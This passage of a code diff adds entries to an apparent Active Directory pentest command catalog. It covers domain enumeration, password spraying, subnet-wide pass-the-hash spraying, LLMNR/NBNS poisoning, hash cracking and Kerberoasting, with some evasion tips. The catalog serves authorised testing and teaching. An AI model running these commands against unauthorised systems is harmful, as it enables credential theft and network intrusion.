+{id:'ENUM_010',phase:'enumeration',title:'windapsearch Help',desc:'Display windapsearch options',tool:'windapsearch',os:'linux',noise:'low',auth:'none',
+cmd:'python3 windapsearch.py -h',
+failureIndicators:['Script not found'],
+notes:'Reference command'},
+
+{id:'ENUM_011',phase:'enumeration',title:'windapsearch Anonymous',desc:'Enumerate users via anonymous LDAP',tool:'windapsearch',os:'linux',noise:'low',auth:'none',
+cmd:"python3 windapsearch.py --dc-ip {DC_IP} -u '' -U",
+failureIndicators:['Anonymous LDAP disabled','Connection error'],
+notes:'Requires anonymous LDAP binds to be allowed'},
+
+{id:'ENUM_012',phase:'enumeration',title:'windapsearch Domain Admins',desc:'Enumerate Domain Admins with creds',tool:'windapsearch',os:'linux',noise:'low',auth:'required',
+cmd:"python3 windapsearch.py --dc-ip {DC_IP} -u '{NETBIOS}\\{USERNAME}' -p '{PASSWORD}' --da",
+failureIndicators:['Authentication failed','No Domain Admins found'],
+notes:'Authenticated LDAP enumeration'},
+
+{id:'ENUM_013',phase:'enumeration',title:'windapsearch Privileged Users',desc:'Recursive privileged user search',tool:'windapsearch',os:'linux',noise:'low',auth:'required',
+cmd:"python3 windapsearch.py --dc-ip {DC_IP} -u '{NETBIOS}\\{USERNAME}' -p '{PASSWORD}' -PU",
+failureIndicators:['Authentication failed','Connection error'],
+notes:'Finds users with elevated privileges'},
+
+{id:'ENUM_014',phase:'enumeration',title:'ldapsearch All Users',desc:'Dump users via authenticated LDAP',tool:'ldapsearch',os:'linux',noise:'low',auth:'required',
+cmd:"ldapsearch -H ldap://{DC_IP} -x -D '{USERNAME}@{DOMAIN}' -w '{PASSWORD}' -b '{BASE_DN}' '(objectClass=user)' sAMAccountName",
+failureIndicators:['Authentication failed','LDAP connection error'],
+notes:'Requires valid credentials'},
+
+{id:'ENUM_015',phase:'enumeration',title:'ldapsearch Anonymous',desc:'Test anonymous LDAP bind',tool:'ldapsearch',os:'linux',noise:'low',auth:'none',
+cmd:'ldapsearch -H ldap://{DC_IP} -x -s base namingcontexts',
+failureIndicators:['Anonymous bind disabled','Connection error'],
+notes:'Check if anonymous LDAP is allowed'},
+
+{id:'ENUM_016',phase:'enumeration',title:'ldapsearch Password Policy',desc:'Get password policy via LDAP',tool:'ldapsearch',os:'linux',noise:'low',auth:'none',
+cmd:"ldapsearch -h {DC_IP} -x -b '{BASE_DN}' -s sub '*' | grep -m 1 -B 10 pwdHistoryLength",
+failureIndicators:['Anonymous bind disabled','Attribute not returned'],
+warning:'CHECK THIS BEFORE PASSWORD SPRAYING!',
+notes:'Important for safe password spraying'},
+
+{id:'ENUM_017',phase:'enumeration',title:'ldapdomaindump',desc:'Full LDAP dump with HTML reports',tool:'ldapdomaindump',os:'linux',noise:'med',auth:'required',
+cmd:"ldapdomaindump -u '{DOMAIN}\\{USERNAME}' -p '{PASSWORD}' ldap://{DC_IP} -o ldap-dump/",
+failureIndicators:['Authentication failed','Connection error'],
+notes:'Creates HTML reports for easy browsing'},
+
+{id:'ENUM_018',phase:'enumeration',title:'CrackMapExec Pass Policy',desc:'Get password policy with valid creds',tool:'CrackMapExec',os:'linux',noise:'med',auth:'required',
+cmd:"crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --pass-pol",
+failureIndicators:['Authentication failure','Access denied'],
+warning:'CHECK THIS BEFORE PASSWORD SPRAYING!',
+notes:'Generates logon events'},
+
+{id:'ENUM_019',phase:'enumeration',title:'CrackMapExec Users NULL',desc:'Enumerate users via NULL session',tool:'CrackMapExec',os:'linux',noise:'med',auth:'none',
+cmd:'crackmapexec smb {DC_IP} --users',
+failureIndicators:['NULL sessions disabled','No users returned'],
+notes:'May not work on modern Windows'},
+
+{id:'ENUM_020',phase:'enumeration',title:'CrackMapExec Users Auth',desc:'Enumerate domain users with creds',tool:'CrackMapExec',os:'linux',noise:'med',auth:'required',
+cmd:"crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --users",
+failureIndicators:['Authentication failure','Access denied'],
+notes:'Authenticated enumeration - more complete'},
+
+{id:'ENUM_021',phase:'enumeration',title:'CrackMapExec Groups',desc:'Enumerate domain groups',tool:'CrackMapExec',os:'linux',noise:'med',auth:'required',
+cmd:"crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --groups",
+failureIndicators:['Authentication failure','Access denied'],
+notes:'Lists all domain groups'},
+
+{id:'ENUM_022',phase:'enumeration',title:'CrackMapExec Logged On',desc:'Find logged on users on target',tool:'CrackMapExec',os:'linux',noise:'med',auth:'required',
+cmd:"crackmapexec smb {TARGET_HOST} -u {USERNAME} -p '{PASSWORD}' --loggedon-users",
+failureIndicators:['Authentication failure','Access denied'],
+notes:'Find high-value targets for credential theft'},
+
+{id:'ENUM_023',phase:'enumeration',title:'CrackMapExec Shares',desc:'Enumerate SMB shares',tool:'CrackMapExec',os:'linux',noise:'low',auth:'required',
+cmd:"crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --shares",
+failureIndicators:['Authentication failure','Access denied'],
+notes:'Shows share permissions'},
+
+{id:'ENUM_024',phase:'enumeration',title:'CrackMapExec Spider',desc:'Spider shares for sensitive files',tool:'CrackMapExec',os:'linux',noise:'med',auth:'required',
+cmd:"crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' -M spider_plus --share 'Dev-share'",
+failureIndicators:['Share not found','Access denied'],
+notes:'Lists all readable files in share'},
+
+{id:'ENUM_025',phase:'enumeration',title:'smbmap Shares',desc:'Map shares with permissions',tool:'smbmap',os:'linux',noise:'low',auth:'required',
+cmd:"smbmap -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -H {DC_IP}",
+failureIndicators:['Authentication error','Connection failed'],
+notes:'Shows READ/WRITE permissions'},
+
+{id:'ENUM_026',phase:'enumeration',title:'smbmap Recursive',desc:'Recursive share listing',tool:'smbmap',os:'linux',noise:'med',auth:'required',
+cmd:"smbmap -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -H {DC_IP} -R SYSVOL --dir-only",
+failureIndicators:['Access denied','Share not found'],
+notes:'Browse SYSVOL for GPO data'},
+
+{id:'ENUM_027',phase:'enumeration',title:'BloodHound Python',desc:'Collect AD data for BloodHound',tool:'BloodHound',os:'linux',noise:'med',auth:'required',
+cmd:"bloodhound-python -u '{USERNAME}' -p '{PASSWORD}' -ns {DC_IP} -d {DOMAIN} -c all",
+failureIndicators:['Authentication failure','LDAP errors','DNS errors'],
+notes:'Creates JSON files for BloodHound import'},
+
+{id:'ENUM_028',phase:'enumeration',title:'SharpHound',desc:'Windows BloodHound collector',tool:'BloodHound',os:'windows',noise:'med',auth:'required',
+cmd:'.\\SharpHound.exe -c All --zipfilename bloodhound.zip',
+failureIndicators:['Access denied','AV detection'],
+notes:'May be detected by AV - use -c DCOnly for stealth'},
+
+{id:'ENUM_029',phase:'enumeration',title:'adidnsdump',desc:'Dump AD-integrated DNS records',tool:'adidnsdump',os:'linux',noise:'low',auth:'required',
+cmd:"adidnsdump -u '{NETBIOS}\\{USERNAME}' ldap://{DC_IP}",
+failureIndicators:['Authentication failed','DNS zone not found'],
+notes:'Useful for finding hidden hosts'},
+
+{id:'ENUM_030',phase:'enumeration',title:'adidnsdump Resolve',desc:'Resolve unknown DNS records',tool:'adidnsdump',os:'linux',noise:'low',auth:'required',
+cmd:"adidnsdump -u '{NETBIOS}\\{USERNAME}' ldap://{DC_IP} -r",
+failureIndicators:['Resolution failed','Access denied'],
+notes:'Performs A queries for unknown records'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: ENUMERATION - PowerView & Native AD
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'PV_001',phase:'enumeration',title:'Get-Module',desc:'List all available PowerShell modules',tool:'PowerShell',os:'windows',noise:'low',auth:'none',
+cmd:'Get-Module',
+failureIndicators:['N/A'],
+notes:'Reference command to check loaded modules'},
+
+{id:'PV_002',phase:'enumeration',title:'Get-ADDomain',desc:'Get domain information (native)',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'Get-ADDomain',
+failureIndicators:['Module not loaded','Not a domain member'],
+notes:'Requires AD module loaded'},
+
+{id:'PV_003',phase:'enumeration',title:'Get-ADUser SPN',desc:'Find users with SPNs set (Kerberoastable)',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName',
+failureIndicators:['Module not loaded','Access denied'],
+notes:'Native method to find Kerberoastable accounts'},
+
+{id:'PV_004',phase:'enumeration',title:'Get-ADTrust',desc:'Enumerate trust relationships',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'Get-ADTrust -Filter *',
+failureIndicators:['Module not loaded','No trusts found'],
+notes:'Discover inter-domain attack paths'},
+
+{id:'PV_005',phase:'enumeration',title:'Get-ADGroup',desc:'Enumerate groups by name',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'Get-ADGroup -Filter * | select name',
+failureIndicators:['Module not loaded','Access denied'],
+notes:'List all domain groups'},
+
+{id:'PV_006',phase:'enumeration',title:'Get-ADGroup Identity',desc:'Get specific group details',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:"Get-ADGroup -Identity 'Backup Operators'",
+failureIndicators:['Group not found','Access denied'],
+notes:'Target high-value groups'},
+
+{id:'PV_007',phase:'enumeration',title:'Get-ADGroupMember',desc:'Get members of specific group',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:"Get-ADGroupMember -Identity 'Backup Operators'",
+failureIndicators:['Group not found','Access denied'],
+notes:'Enumerate privileged group membership'},
+
+{id:'PV_008',phase:'enumeration',title:'Get-ADUser Export',desc:'Export all users to file',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt',
+failureIndicators:['Access denied','Permission error'],
+notes:'Create user list for password spraying'},
+
+{id:'PV_009',phase:'enumeration',title:'Get-Domain',desc:'Get current domain information',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-Domain',
+failureIndicators:['PowerView not loaded','Not in domain context'],
+notes:'PowerView domain enumeration'},
+
+{id:'PV_010',phase:'enumeration',title:'Get-DomainController',desc:'List all domain controllers',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainController',
+failureIndicators:['PowerView not loaded','Access denied'],
+notes:'Identify DC targets'},
+
+{id:'PV_011',phase:'enumeration',title:'Get-DomainUser',desc:'List all domain users',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainUser',
+failureIndicators:['PowerView not loaded','Access denied'],
+notes:'Add -Properties * for detailed info'},
+
+{id:'PV_012',phase:'enumeration',title:'Get-DomainUser SPN',desc:'Find Kerberoastable users',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName',
+failureIndicators:['No SPNs found','PowerView not loaded'],
+notes:'Users with SPNs can be Kerberoasted'},
+
+{id:'PV_013',phase:'enumeration',title:'Get-DomainUser NoPreauth',desc:'Find AS-REP roastable users',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,userprincipalname,useraccountcontrol',
+failureIndicators:['No users found','PowerView not loaded'],
+notes:'Users with DONT_REQ_PREAUTH flag'},
+
+{id:'PV_014',phase:'enumeration',title:'Get-DomainComputer',desc:'List all domain computers',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainComputer',
+failureIndicators:['PowerView not loaded','Access denied'],
+notes:'Enumerate all joined computers'},
+
+{id:'PV_015',phase:'enumeration',title:'Get-DomainGroup',desc:'List all domain groups',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainGroup | Select-Object name',
+failureIndicators:['PowerView not loaded','Access denied'],
+notes:'Quick group listing'},
+
+{id:'PV_016',phase:'enumeration',title:'Get-DomainGroupMember Recurse',desc:'Get Domain Admins members recursively',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:"Get-DomainGroupMember -Identity 'Domain Admins' -Recurse",
+failureIndicators:['Group not found','Access denied'],
+notes:'-Recurse gets nested group members'},
+
+{id:'PV_017',phase:'enumeration',title:'Get-DomainOU',desc:'List all Organizational Units',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainOU',
+failureIndicators:['PowerView not loaded','Access denied'],
+notes:'Map AD structure'},
+
+{id:'PV_018',phase:'enumeration',title:'Get-DomainGPO',desc:'List all GPOs with paths',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainGPO | Select-Object displayname,gpcfilesyspath',
+failureIndicators:['PowerView not loaded','Access denied'],
+notes:'Check SYSVOL paths for GPP passwords'},
+
+{id:'PV_019',phase:'enumeration',title:'Get-DomainPolicy',desc:'Get domain password policy',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainPolicy',
+failureIndicators:['PowerView not loaded','Access denied'],
+warning:'CHECK THIS BEFORE PASSWORD SPRAYING!',
+notes:'Critical for safe password spraying'},
+
+{id:'PV_020',phase:'enumeration',title:'Get-DomainTrust',desc:'Enumerate domain trusts',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainTrust',
+failureIndicators:['No trusts found','PowerView not loaded'],
+notes:'Find cross-domain attack paths'},
+
+{id:'PV_021',phase:'enumeration',title:'Get-ForestTrust',desc:'Enumerate forest trusts',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-ForestTrust',
+failureIndicators:['No trusts found','PowerView not loaded'],
+notes:'Find cross-forest attack paths'},
+
+{id:'PV_022',phase:'enumeration',title:'Get-DomainTrustMapping',desc:'Map all trust relationships',tool:'PowerView',os:'windows',noise:'med',auth:'required',
+cmd:'Get-DomainTrustMapping',
+failureIndicators:['PowerView not loaded','Access denied'],
+notes:'Comprehensive trust enumeration'},
+
+{id:'PV_023',phase:'enumeration',title:'Find-LocalAdminAccess',desc:'Find where current user has local admin',tool:'PowerView',os:'windows',noise:'high',auth:'required',
+cmd:'Find-LocalAdminAccess -Verbose',
+failureIndicators:['PowerView not loaded','Timeout'],
+warning:'NOISY - connects to many hosts!',
+notes:'Add -ComputerFile to limit scope'},
+
+{id:'PV_024',phase:'enumeration',title:'Find-DomainUserLocation',desc:'Find where users are logged in',tool:'PowerView',os:'windows',noise:'high',auth:'required',
+cmd:'Find-DomainUserLocation',
+failureIndicators:['PowerView not loaded','Timeout'],
+notes:'Find high-value targets'},
+
+{id:'PV_025',phase:'enumeration',title:'Find-DomainShare',desc:'Find accessible shares',tool:'PowerView',os:'windows',noise:'high',auth:'required',
+cmd:'Find-DomainShare',
+failureIndicators:['PowerView not loaded','Timeout'],
+notes:'Can be slow on large domains'},
+
+{id:'PV_026',phase:'enumeration',title:'Find-InterestingDomainShareFile',desc:'Find sensitive files in shares',tool:'PowerView',os:'windows',noise:'high',auth:'required',
+cmd:'Find-InterestingDomainShareFile',
+failureIndicators:['PowerView not loaded','Timeout'],
+notes:'Searches for passwords, configs, etc.'},
+
+{id:'PV_027',phase:'enumeration',title:'Get-NetLocalGroup',desc:'Enumerate local groups on machine',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-NetLocalGroup',
+failureIndicators:['Access denied','Host unreachable'],
+notes:'Lists local groups on target'},
+
+{id:'PV_028',phase:'enumeration',title:'Get-NetLocalGroupMember',desc:'Get local Administrators members',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-NetLocalGroupMember -GroupName Administrators',
+failureIndicators:['Access denied','Group not found'],
+notes:'Find local admin accounts'},
+
+{id:'PV_029',phase:'enumeration',title:'Get-NetSession',desc:'Get active sessions on machine',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-NetSession',
+failureIndicators:['Access denied','Host unreachable'],
+notes:'Find logged-in users'},
+
+{id:'PV_030',phase:'enumeration',title:'Test-AdminAccess',desc:'Test if you have local admin on target',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Test-AdminAccess -ComputerName {DC_NAME}',
+failureIndicators:['Access denied','Host unreachable'],
+notes:'Quick local admin check'},
+
+{id:'PV_031',phase:'enumeration',title:'Get-DomainForeignUser',desc:'Find users in foreign domain groups',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainForeignUser',
+failureIndicators:['No foreign users found','PowerView not loaded'],
+notes:'Cross-domain trust enumeration'},
+
+{id:'PV_032',phase:'enumeration',title:'Get-DomainForeignGroupMember',desc:'Find foreign group members',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainForeignGroupMember',
+failureIndicators:['No foreign members found','PowerView not loaded'],
+notes:'Cross-domain membership enumeration'},
+
+{id:'PV_033',phase:'enumeration',title:'Convert-NameToSid',desc:'Convert username to SID',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Convert-NameToSid {USERNAME}',
+failureIndicators:['User not found','PowerView not loaded'],
+notes:'Useful for ACL analysis'},
+
+{id:'PV_034',phase:'enumeration',title:'Get-DomainSPNTicket',desc:'Request TGS ticket for SPN',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:"Get-DomainSPNTicket -SPN 'MSSQLSvc/{DC_NAME}:1433'",
+failureIndicators:['SPN not found','PowerView not loaded'],
+notes:'Manual Kerberoasting'},
+
+{id:'PV_035',phase:'enumeration',title:'Snaffler',desc:'Find sensitive data in shares',tool:'Snaffler',os:'windows',noise:'med',auth:'required',
+cmd:'.\\Snaffler.exe -d {DOMAIN} -s -v data',
+failureIndicators:['AV detection','Access denied'],
+notes:'Automated sensitive file finder'},
+
+{id:'PV_036',phase:'enumeration',title:'Get-DomainUser Descriptions',desc:'Find passwords in user descriptions',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainUser * | Select-Object samaccountname,description',
+failureIndicators:['PowerView not loaded','Access denied'],
+notes:'Admins often store passwords in descriptions'},
+
+{id:'PV_037',phase:'enumeration',title:'Get-DomainUser PASSWD_NOTREQD',desc:'Find users with no password required',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol',
+failureIndicators:['No users found','PowerView not loaded'],
+notes:'Accounts that might have blank passwords'},
+
+{id:'PV_038',phase:'enumeration',title:'Get-DomainSID',desc:'Get SID of current domain',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainSID',
+failureIndicators:['PowerView not loaded'],
+notes:'Needed for Golden Ticket attacks'},
+
+{id:'PV_039',phase:'enumeration',title:'Get Enterprise Admins SID',desc:'Get Enterprise Admins group SID',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:"Get-DomainGroup -Domain {DOMAIN} -Identity 'Enterprise Admins' | Select-Object distinguishedname,objectsid",
+failureIndicators:['Group not found','PowerView not loaded'],
+notes:'Needed for ExtraSID attacks'},
+
+{id:'PV_040',phase:'enumeration',title:'Get-NetLocalGroupMember RDP',desc:'Find Remote Desktop Users',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:"Get-NetLocalGroupMember -ComputerName {DC_NAME} -GroupName 'Remote Desktop Users'",
+failureIndicators:['Access denied','Group not found'],
+notes:'Find who can RDP to target'},
+
+{id:'PV_041',phase:'enumeration',title:'Get-NetLocalGroupMember WinRM',desc:'Find Remote Management Users',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:"Get-NetLocalGroupMember -ComputerName {DC_NAME} -GroupName 'Remote Management Users'",
+failureIndicators:['Access denied','Group not found'],
+notes:'Find who can WinRM to target'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: ENUMERATION - Security Controls & GPO
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'SEC_001',phase:'enumeration',title:'Get-MpComputerStatus',desc:'Check Windows Defender status',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'Get-MpComputerStatus',
+failureIndicators:['Cmdlet not found','Access denied'],
+notes:'Determine if AV evasion is needed'},
+
+{id:'SEC_002',phase:'enumeration',title:'Get-AppLockerPolicy',desc:'View AppLocker rules',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections',
+failureIndicators:['Cmdlet not available','No policy configured'],
+notes:'Understand execution restrictions'},
+
+{id:'SEC_003',phase:'enumeration',title:'PS Language Mode',desc:'Check PowerShell language mode',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'$ExecutionContext.SessionState.LanguageMode',
+failureIndicators:['N/A - always returns value'],
+notes:'ConstrainedLanguage limits available features'},
+
+{id:'SEC_004',phase:'enumeration',title:'Find-LAPSDelegatedGroups',desc:'Find groups with LAPS read access',tool:'LAPSToolkit',os:'windows',noise:'low',auth:'required',
+cmd:'Find-LAPSDelegatedGroups',
+failureIndicators:['LAPS not deployed','PowerView not loaded'],
+notes:'Requires LAPS to be in use'},
+
+{id:'SEC_005',phase:'enumeration',title:'Find-AdmPwdExtendedRights',desc:'Find users with LAPS read rights',tool:'LAPSToolkit',os:'windows',noise:'low',auth:'required',
+cmd:'Find-AdmPwdExtendedRights',
+failureIndicators:['LAPS not deployed','Access denied'],
+notes:'Who can read LAPS passwords'},
+
+{id:'SEC_006',phase:'enumeration',title:'Get-LAPSComputers',desc:'Find computers with LAPS passwords',tool:'LAPSToolkit',os:'windows',noise:'low',auth:'required',
+cmd:'Get-LAPSComputers',
+failureIndicators:['LAPS not deployed','No computers found'],
+notes:'Target machines for LAPS password retrieval'},
+
+{id:'SEC_007',phase:'defense-evasion',title:'Disable NBT-NS',desc:'Disable NBT-NS to prevent poisoning',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'$regkey = "HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces"\nGet-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}',
+failureIndicators:['Access denied','Registry path not found'],
+notes:'Defensive command - requires admin rights'},
+
+{id:'SEC_008',phase:'enumeration',title:'Get-SpoolStatus',desc:'Check for Print Spooler vulnerability',tool:'SecurityAssessment',os:'windows',noise:'low',auth:'required',
+cmd:'Get-SpoolStatus -ComputerName {DC_NAME}',
+failureIndicators:['Module not loaded','Host unreachable'],
+notes:'Check for PrintNightmare vulnerability'},
+
+{id:'SEC_009',phase:'enumeration',title:'SYSVOL Scripts List',desc:'List scripts in SYSVOL share',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'ls \\\\{DC_NAME}\\SYSVOL\\{DOMAIN}\\scripts',
+failureIndicators:['Access denied','Path not found'],
+notes:'Look for credentials in scripts'},
+
+{id:'SEC_010',phase:'enumeration',title:'DC C$ Access Test',desc:'Test admin access to DC C$ share',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'ls \\\\{DC_NAME}\\c$',
+failureIndicators:['Access denied'],
+notes:'Indicates local admin on DC'},
+
+{id:'SEC_011',phase:'enumeration',title:'Get-GPO All',desc:'Enumerate all GPOs (native)',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'Get-GPO -All | Select DisplayName',
+failureIndicators:['Module not loaded','Access denied'],
+notes:'Native GPO enumeration'},
+
+{id:'SEC_012',phase:'enumeration',title:'GPO Permissions Check',desc:'Find modifiable GPOs',tool:'PowerView',os:'windows',noise:'med',auth:'required',
+cmd:"$sid=Convert-NameToSid 'Domain Users'\nGet-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}",
+failureIndicators:['PowerView not loaded','Access denied'],
+notes:'Find GPOs that can be abused'},
+
+{id:'SEC_013',phase:'enumeration',title:'Get-GPO by GUID',desc:'Get GPO name from GUID',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532',
+failureIndicators:['GUID not found','Module not loaded'],
+notes:'Lookup GPO details by GUID'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: CREDENTIAL ACCESS - Password Attacks
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'CRED_001',phase:'credential-access',title:'Kerbrute Password Spray',desc:'Kerberos-based password spraying',tool:'Kerbrute',os:'linux',noise:'high',auth:'none',
+cmd:"kerbrute passwordspray -d {DOMAIN} --dc {DC_IP} valid_users.txt '{PASSWORD}'",
+failureIndicators:['No successful logins','Pre-auth failures','Connection errors'],
+warning:'CHECK PASSWORD POLICY BEFORE SPRAYING! Risk of lockouts.',
+notes:'Kerberos-based may evade some detection'},
+
+{id:'CRED_002',phase:'credential-access',title:'CrackMapExec Spray',desc:'SMB-based password spraying',tool:'CrackMapExec',os:'linux',noise:'high',auth:'none',
+cmd:"sudo crackmapexec smb {DC_IP} -u valid_users.txt -p '{PASSWORD}' | grep +",
+failureIndicators:['No + in output','All attempts fail'],
+warning:'DANGER: Check password policy first! High lockout risk.',
+notes:'Very noisy, generates many logon events'},
+
+{id:'CRED_003',phase:'credential-access',title:'CrackMapExec Validate',desc:'Validate discovered credentials',tool:'CrackMapExec',os:'linux',noise:'low',auth:'none',
+cmd:"sudo crackmapexec smb {DC_IP} -u {USERNAME} -p '{PASSWORD}'",
+failureIndicators:['Authentication failure','Host unreachable'],
+notes:'Verify credentials work before using'},
+
+{id:'CRED_004',phase:'credential-access',title:'CrackMapExec Local PTH Spray',desc:'Spray local admin hash across network',tool:'CrackMapExec',os:'linux',noise:'high',auth:'none',
+cmd:"sudo crackmapexec smb --local-auth {NETWORK}.0/24 -u administrator -H {NTHASH} | grep +",
+failureIndicators:['No successes','Hosts unreachable'],
+warning:'Very noisy - sprays across entire subnet!',
+notes:'Find password reuse with local admin hash'},
+
+{id:'CRED_005',phase:'credential-access',title:'rpcclient Spray',desc:'Password spray via RPC',tool:'rpcclient',os:'linux',noise:'high',auth:'none',
+cmd:'for u in $(cat valid_users.txt);do rpcclient -U "$u%{PASSWORD}" -c "getusername;quit" {DC_IP} | grep Authority; done',
+failureIndicators:['All attempts fail','Connection refused'],
+warning:'CHECK PASSWORD POLICY FIRST!',
+notes:'High risk of lockouts'},
+
+{id:'CRED_006',phase:'credential-access',title:'DomainPasswordSpray',desc:'Windows-based password spraying',tool:'DomainPasswordSpray',os:'windows',noise:'high',auth:'none',
+cmd:"Invoke-DomainPasswordSpray -Password '{PASSWORD}' -OutFile spray_success -ErrorAction SilentlyContinue",
+failureIndicators:['No valid pairs found','Module not loaded'],
+warning:'CHECK PASSWORD POLICY BEFORE SPRAYING!',
+notes:'Queries AD for user list automatically'},
+
+{id:'CRED_007',phase:'credential-access',title:'net accounts',desc:'Check password policy (Windows)',tool:'Native',os:'windows',noise:'low',auth:'none',
+cmd:'net accounts',
+failureIndicators:['Not a domain member'],
+warning:'CHECK THIS BEFORE PASSWORD SPRAYING!',
+notes:'Quick password policy check'},
+
+{id:'CRED_008',phase:'credential-access',title:'Inveigh Start',desc:'Windows LLMNR/NBNS poisoning',tool:'Inveigh',os:'windows',noise:'high',auth:'none',
+cmd:'Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y',
+failureIndicators:['Access denied','No traffic observed'],
+notes:'Windows-based poisoning tool'},
+
+{id:'CRED_009',phase:'credential-access',title:'Inveigh.exe',desc:'C# implementation of Inveigh',tool:'Inveigh',os:'windows',noise:'high',auth:'none',
+cmd:'.\\Inveigh.exe',
+failureIndicators:['Permission errors','AV detection'],
+notes:'Compiled version may evade some detection'},
+
+{id:'CRED_010',phase:'credential-access',title:'Hashcat NTLMv2',desc:'Crack NTLMv2 hashes from Responder',tool:'Hashcat',os:'linux',noise:'low',auth:'none',
+cmd:'hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -O --force',
+failureIndicators:['No passwords cracked','Invalid hash format'],
+notes:'Use -r rules for better success rate'},
+
+{id:'CRED_011',phase:'credential-access',title:'Hashcat with Rules',desc:'Crack with rules for better coverage',tool:'Hashcat',os:'linux',noise:'low',auth:'none',
+cmd:'hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force',
+failureIndicators:['No passwords cracked','Insufficient resources'],
+notes:'Rules significantly improve crack rate'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: CREDENTIAL ACCESS - Kerberoasting
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'KERB_001',phase:'credential-access',title:'GetUserSPNs List',desc:'List Kerberoastable accounts',tool:'Impacket',os:'linux',noise:'low',auth:'required',
+cmd:"GetUserSPNs.py -dc-ip {DC_IP} {DOMAIN}/{USERNAME}",
+failureIndicators:['Authentication failure','No SPNs found'],
+notes:'First step - enumerate SPNs before requesting tickets'},
+
+{id:'KERB_002',phase:'credential-access',title:'GetUserSPNs Request',desc:'Request all TGS tickets for cracking',tool:'Impacket',os:'linux',noise:'med',auth:'required',
+cmd:"GetUserSPNs.py -dc-ip {DC_IP} {DOMAIN}/{USERNAME} -request -outputfile kerberoast.txt",
+failureIndicators:['Authentication failure','Ticket request failed'],
+notes:'Crack with hashcat -m 13100'},
+
+{id:'KERB_003',phase:'credential-access',title:'GetUserSPNs Target User',desc:'Kerberoast specific user',tool:'Impacket',os:'linux',noise:'low',auth:'required',
